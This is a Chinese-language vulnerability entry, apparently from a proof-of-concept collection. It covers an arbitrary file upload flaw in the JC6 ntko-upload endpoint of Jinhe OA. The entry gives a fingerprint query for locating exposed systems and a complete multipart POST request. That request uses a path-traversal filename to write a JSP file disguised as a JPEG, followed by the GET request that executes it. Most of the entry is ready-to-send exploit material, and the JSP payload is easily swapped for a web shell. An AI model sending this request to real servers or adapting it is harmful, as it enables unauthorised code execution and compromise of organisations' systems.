# 金和OAJC6ntko-upload任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 439`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="filename"
../../../../upload/stc.jsp
--00content0boundary00
Content-Disposition: form-data; name="upLoadFile"; filename="stc.jpg"
Content-Type: image/jpeg
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00
Content-Disposition: form-data; name="Submit"
upload
--00content0boundary00--

上传文件位置
GET /upload/stc.jsp HTTP/1.1
Host:
```

**其他**
- 金和OA JC6 ntko-upload 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA